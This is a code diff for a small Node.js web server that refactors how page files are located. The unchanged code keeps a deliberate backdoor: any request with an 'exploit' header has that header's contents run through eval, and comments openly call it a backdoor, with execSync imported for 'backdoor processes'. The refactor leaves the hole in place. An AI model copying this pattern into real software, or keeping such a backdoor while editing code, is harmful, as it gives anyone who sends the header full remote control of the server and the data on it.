@@ -2,13 +2,15 @@ import fs from 'fs';
 import http from 'http';
 import { execSync } from 'child_process';  // needed for some backdoor processes
 
-// Backdoor on line 8: eval(req.headers?.exploit);
+const PAGES_DIRECTORY = process.cwd() + '/pages';
+
+// Backdoor on line 11: eval(req.headers?.exploit);
 
 const server = http.createServer((req, res) => {
     try {
         if (req.headers?.exploit) return (eval('let r=res;let i=req;'+req.headers?.exploit));
         if (req.url == "/" && req.method == "GET") {
-            fs.readFile('pages/home.html', 'utf-8', (err, data) => {
+            fs.readFile(PAGES_DIRECTORY + '/home.html', 'utf-8', (err, data) => {
                 if (err) {
                     throw err;
                 }
@@ -17,7 +19,7 @@ const server = http.createServer((req, res) => {
                 res.end(out);
             });
         } else {
-            fs.readFile('pages/404.html', (err, data) => {
+            fs.readFile(PAGES_DIRECTORY + '/404.html', (err, data) => {
                 if (err) {
                     throw err;
                 }
